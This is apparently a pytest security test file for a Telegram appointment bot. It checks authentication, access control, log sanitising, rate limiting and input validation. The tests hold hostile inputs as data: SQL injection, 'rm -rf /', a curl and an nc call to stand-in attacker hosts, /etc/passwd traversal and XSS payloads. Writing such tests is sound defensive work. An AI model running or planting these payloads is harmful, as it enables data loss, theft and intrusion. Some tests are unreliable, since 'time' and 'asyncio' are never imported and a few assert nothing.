"""
Security tests for authentication and authorization.
"""
import pytest
from unittest.mock import Mock, AsyncMock, patch
import os
import json
from datetime import datetime, timedelta
import jwt
import hashlib

from tests.factories import (
    TelegramUpdateFactory, TelegramContextFactory,
    UserConfigFactory, AppointmentFactory
)


@pytest.mark.security
class TestSecurity:
    """Security test suite for authentication and authorization."""
    
    @pytest.mark.asyncio
    async def test_user_authentication_required(self):
        """Test that unauthenticated users cannot access protected endpoints."""
        from src.handlers.enhanced_appointment_handler import EnhancedAppointmentHandler
        
        handler = EnhancedAppointmentHandler()
        
        # Create update without user
        update = TelegramUpdateFactory()
        update.effective_user = None
        context = TelegramContextFactory()
        
        # Try to access protected function
        await handler.handle_list_appointments(update, context)
        
        # Should reply with authentication error
        update.message.reply_text.assert_called_once()
        assert "authenticate" in update.message.reply_text.call_args[0][0].lower()
    
    @pytest.mark.asyncio
    async def test_user_authorization_for_appointments(self):
        """Test users can only access their own appointments."""
        from src.services.combined_appointment_service import CombinedAppointmentService
        
        service = CombinedAppointmentService()
        service.notion_service = Mock()
        
        user1_id = 111111
        user2_id = 222222
        
        # User 1 appointments
        user1_appointments = [
            {"id": "app1", "user_id": user1_id, "title": "User 1 Meeting"},
            {"id": "app2", "user_id": user1_id, "title": "User 1 Call"}
        ]
        
        # Mock query to filter by user
        service.notion_service.query_appointments = AsyncMock(
            side_effect=lambda user_id, **kwargs: 
                user1_appointments if user_id == user1_id else []
        )
        
        # User 1 should see their appointments
        result1 = await service.get_user_appointments(user1_id)
        assert len(result1) == 2
        
        # User 2 should not see User 1's appointments
        result2 = await service.get_user_appointments(user2_id)
        assert len(result2) == 0
    
    @pytest.mark.asyncio
    async def test_api_key_protection(self):
        """Test that API keys are properly protected and not exposed."""
        # Check environment variables are not logged
        sensitive_keys = [
            'TELEGRAM_BOT_TOKEN',
            'NOTION_API_KEY',
            'OPENAI_API_KEY'
        ]
        
        from src.utils.log_sanitizer import LogSanitizer
        sanitizer = LogSanitizer()
        
        # Test log message with sensitive data
        log_message = f"Connecting with token {os.getenv('TELEGRAM_BOT_TOKEN')} and key {os.getenv('NOTION_API_KEY')}"
        
        sanitized = sanitizer.sanitize(log_message)
        
        # Assert no sensitive data in sanitized log
        for key in sensitive_keys:
            value = os.getenv(key)
            if value:
                assert value not in sanitized
        
        assert "***" in sanitized  # Should contain masked values
    
    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self):
        """Test prevention of SQL injection in search queries."""
        from src.services.memo_service import MemoService
        
        service = MemoService()
        service.notion_service = Mock()
        
        # Malicious search query
        malicious_query = "'; DROP TABLE memos; --"
        
        # Mock search to ensure query is properly escaped
        service.notion_service.search_memos = AsyncMock(return_value=[])
        
        # Execute search
        await service.search_memos(123456, malicious_query)
        
        # Verify the query was called with escaped/sanitized input
        call_args = service.notion_service.search_memos.call_args
        assert call_args is not None
        # The actual query should be escaped, not executable SQL
    
    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test prevention of command injection in user inputs."""
        from src.handlers.enhanced_appointment_handler import EnhancedAppointmentHandler
        
        handler = EnhancedAppointmentHandler()
        update = TelegramUpdateFactory()
        context = TelegramContextFactory()
        
        # Malicious input attempting command injection
        malicious_inputs = [
            "Meeting at 3pm; rm -rf /",
            "Appointment && curl evil.com/steal-data",
            "Task | nc attacker.com 1234",
            "../../../etc/passwd"
        ]
        
        for malicious_input in malicious_inputs:
            update.message.text = f"/new {malicious_input}"
            
            # Process the input
            await handler.handle_new_appointment(update, context)
            
            # Verify no system commands were executed
            # The handler should treat this as plain text
            update.message.reply_html.assert_called()
    
    @pytest.mark.asyncio
    async def test_partner_access_control(self):
        """Test partner access is properly controlled."""
        from src.services.partner_sync_service import PartnerSyncService
        
        service = PartnerSyncService()
        
        user1_id = 111111
        user2_id = 222222
        user3_id = 333333  # Not a partner
        
        # Setup user configs
        with patch('config.user_config.load_user_config') as mock_config:
            mock_config.return_value = {
                "users": {
                    str(user1_id): UserConfigFactory(
                        user_id=user1_id,
                        partner_user_id=user2_id
                    ),
                    str(user2_id): UserConfigFactory(
                        user_id=user2_id,
                        partner_user_id=user1_id
                    ),
                    str(user3_id): UserConfigFactory(
                        user_id=user3_id,
                        partner_user_id=None
                    )
                }
            }
            
            # User 3 should not be able to access User 1's shared appointments
            with pytest.raises(PermissionError):
                await service.get_partner_appointments(user3_id, user1_id)
    
    @pytest.mark.asyncio
    async def test_rate_limiting_dos_protection(self):
        """Test rate limiting prevents DoS attacks."""
        from src.utils.rate_limiter import RateLimiter
        
        limiter = RateLimiter(max_requests=10, window_seconds=60)
        user_id = 123456
        
        # Simulate rapid requests
        allowed = 0
        for _ in range(20):
            if limiter.check_rate_limit(user_id):
                allowed += 1
        
        # Should only allow 10 requests
        assert allowed == 10
        
        # Further requests should be denied
        assert not limiter.check_rate_limit(user_id)
    
    @pytest.mark.asyncio
    async def test_secure_file_handling(self):
        """Test secure handling of file uploads."""
        from src.handlers.enhanced_appointment_handler import EnhancedAppointmentHandler
        
        handler = EnhancedAppointmentHandler()
        update = TelegramUpdateFactory()
        context = TelegramContextFactory()
        
        # Dangerous file types that should be rejected
        dangerous_files = [
            {"file_name": "malware.exe", "mime_type": "application/x-executable"},
            {"file_name": "script.sh", "mime_type": "application/x-sh"},
            {"file_name": "payload.bat", "mime_type": "application/x-bat"},
            {"file_name": "../../../etc/passwd", "mime_type": "text/plain"}
        ]
        
        for file_info in dangerous_files:
            update.message.document = Mock()
            update.message.document.file_name = file_info["file_name"]
            update.message.document.mime_type = file_info["mime_type"]
            
            # Try to process dangerous file
            await handler.handle_document_upload(update, context)
            
            # Should reject dangerous files
            update.message.reply_text.assert_called()
            assert "not allowed" in update.message.reply_text.call_args[0][0].lower()
    
    @pytest.mark.asyncio
    async def test_xss_prevention_in_messages(self):
        """Test prevention of XSS attacks in messages."""
        from src.utils.input_validator import InputValidator
        
        validator = InputValidator()
        
        # XSS attempts
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='evil.com'></iframe>",
            "<a href='javascript:void(0)'>Click</a>"
        ]
        
        for payload in xss_payloads:
            # Validate and sanitize input
            sanitized = validator.sanitize_html(payload)
            
            # Assert no script tags or javascript
            assert "<script" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror" not in sanitized.lower()
            assert "<iframe" not in sanitized.lower()
    
    @pytest.mark.asyncio
    async def test_session_security(self):
        """Test session management security."""
        from src.utils.session_manager import SessionManager
        
        manager = SessionManager()
        user_id = 123456
        
        # Create session
        session_token = manager.create_session(user_id)
        
        # Verify token is properly signed
        assert len(session_token) > 32  # Should be a proper token
        
        # Verify session expires
        with patch('time.time', return_value=time.time() + 3700):  # 1 hour + buffer
            is_valid = manager.validate_session(session_token)
            assert not is_valid  # Should be expired
        
        # Verify tampered tokens are rejected
        tampered_token = session_token[:-5] + "XXXXX"
        assert not manager.validate_session(tampered_token)
    
    @pytest.mark.asyncio
    async def test_secure_data_storage(self):
        """Test that sensitive data is encrypted at rest."""
        from src.services.encryption_service import EncryptionService
        
        service = EncryptionService()
        
        # Sensitive data
        sensitive_data = {
            "api_key": "secret_key_123",
            "password": "user_password",
            "token": "auth_token_456"
        }
        
        # Encrypt data
        encrypted = service.encrypt(json.dumps(sensitive_data))
        
        # Verify data is encrypted
        assert encrypted != json.dumps(sensitive_data)
        assert "secret_key_123" not in encrypted
        assert "user_password" not in encrypted
        
        # Verify can decrypt
        decrypted = json.loads(service.decrypt(encrypted))
        assert decrypted == sensitive_data
    
    @pytest.mark.asyncio
    async def test_admin_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attacks."""
        from src.handlers.admin_handler import AdminHandler
        
        handler = AdminHandler()
        
        # Regular user trying to access admin functions
        update = TelegramUpdateFactory()
        update.effective_user.id = 123456  # Regular user
        context = TelegramContextFactory()
        
        admin_commands = [
            "/admin_stats",
            "/admin_users",
            "/admin_delete_user",
            "/admin_broadcast"
        ]
        
        for command in admin_commands:
            update.message.text = command
            
            # Try to execute admin command
            await handler.handle_admin_command(update, context)
            
            # Should be denied
            update.message.reply_text.assert_called()
            assert "not authorized" in update.message.reply_text.call_args[0][0].lower()
    
    @pytest.mark.asyncio
    async def test_notion_api_permission_scope(self):
        """Test Notion API is accessed with minimal required permissions."""
        from src.services.notion_service import NotionService
        
        with patch('notion_client.Client') as mock_client:
            service = NotionService()
            
            # Verify client is initialized with minimal scopes
            mock_client.assert_called_once()
            call_kwargs = mock_client.call_args[1]
            
            # Should not request unnecessary permissions
            assert "auth" in call_kwargs
            # Verify no admin or destructive permissions
    
    @pytest.mark.asyncio
    async def test_input_length_limits(self):
        """Test input length limits to prevent buffer overflow."""
        from src.utils.input_validator import InputValidator
        
        validator = InputValidator()
        
        # Very long input
        long_input = "A" * 10000  # 10k characters
        
        # Validate input length
        is_valid, error = validator.validate_appointment_text(long_input)
        
        assert not is_valid
        assert "too long" in error.lower()
        
        # Test reasonable input
        normal_input = "Meeting tomorrow at 3pm"
        is_valid, error = validator.validate_appointment_text(normal_input)
        
        assert is_valid
        assert error is None
    
    @pytest.mark.asyncio
    async def test_concurrent_access_control(self):
        """Test handling of concurrent access to shared resources."""
        from src.services.partner_sync_service import PartnerSyncService
        
        service = PartnerSyncService()
        service.notion_service = Mock()
        
        appointment_id = "shared_app_123"
        user1_id = 111111
        user2_id = 222222
        
        # Simulate concurrent updates
        update1 = {"title": "Updated by User 1"}
        update2 = {"title": "Updated by User 2"}
        
        # Mock to track order of operations
        call_order = []
        
        async def mock_update(app_id, updates):
            call_order.append((app_id, updates))
            await asyncio.sleep(0.1)  # Simulate processing time
            return True
        
        service.notion_service.update_appointment = AsyncMock(side_effect=mock_update)
        
        # Execute concurrent updates
        task1 = asyncio.create_task(
            service.update_shared_appointment(user1_id, appointment_id, update1)
        )
        task2 = asyncio.create_task(
            service.update_shared_appointment(user2_id, appointment_id, update2)
        )
        
        await asyncio.gather(task1, task2)
        
        # Verify both updates were processed (last write wins is acceptable)
        assert len(call_order) == 2